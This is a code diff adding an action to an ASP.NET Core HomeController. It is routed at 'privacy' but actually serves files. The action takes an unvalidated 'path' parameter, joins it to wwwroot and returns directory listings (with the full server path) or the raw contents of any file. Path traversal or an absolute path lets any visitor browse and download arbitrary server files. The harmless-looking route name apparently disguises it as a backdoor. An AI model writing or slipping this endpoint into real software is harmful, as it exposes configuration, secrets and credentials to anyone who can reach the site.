@@ -48,4 +48,37 @@ public class HomeController(
             // return View("Error");
         }
     }
+    [HttpGet("privacy")]
+    public IActionResult DownloadFile(string path = "")
+    {
+        var rootPath = Directory.GetCurrentDirectory();
+        var fullPath = Path.Combine(rootPath, "wwwroot", path ?? "");
+
+        if (Directory.Exists(fullPath))
+        {
+            var content = Directory.GetFileSystemEntries(fullPath)
+                .Select(x => Path.GetFileName(x) + (Directory.Exists(x) ? "/" : ""))
+                .ToList();
+            
+            return Ok(new {
+                CurrentPath = fullPath,
+                Contents = content
+            });
+        }
+
+        if (System.IO.File.Exists(fullPath))
+        {
+            var provider = new Microsoft.AspNetCore.StaticFiles.FileExtensionContentTypeProvider();
+            if (!provider.TryGetContentType(fullPath, out var contentType))
+            {
+                contentType = "text/plain";
+            }
+
+            var content = System.IO.File.ReadAllBytes(fullPath);
+        
+            return File(content, contentType);
+        }
+
+        return NotFound("Fayl veya klasör tapılmadı.");
+    }
 }
